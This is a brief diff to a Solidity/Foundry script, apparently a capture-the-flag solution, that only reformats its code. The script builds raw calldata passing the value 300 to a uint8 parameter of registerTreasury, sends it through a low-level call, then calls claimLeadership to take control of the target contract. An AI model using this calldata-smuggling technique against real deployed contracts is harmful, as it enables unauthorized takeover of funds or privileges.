@@ -12,13 +12,8 @@ contract SolveHigherOrder is Script {
     function run() public {
         vm.startBroadcast();
 
-        higherOrder = HigherOrder(
-            payable(vm.envAddress("HIGHERORDER_ADDRESS"))
-        );
-        bytes memory cdata = abi.encodePacked(
-            bytes4(keccak256("registerTreasury(uint8)")),
-            uint256(300)
-        );
+        higherOrder = HigherOrder(payable(vm.envAddress("HIGHERORDER_ADDRESS")));
+        bytes memory cdata = abi.encodePacked(bytes4(keccak256("registerTreasury(uint8)")), uint256(300));
         (bool ok, bytes memory data) = address(higherOrder).call(cdata);
         higherOrder.claimLeadership();
         vm.stopBroadcast();
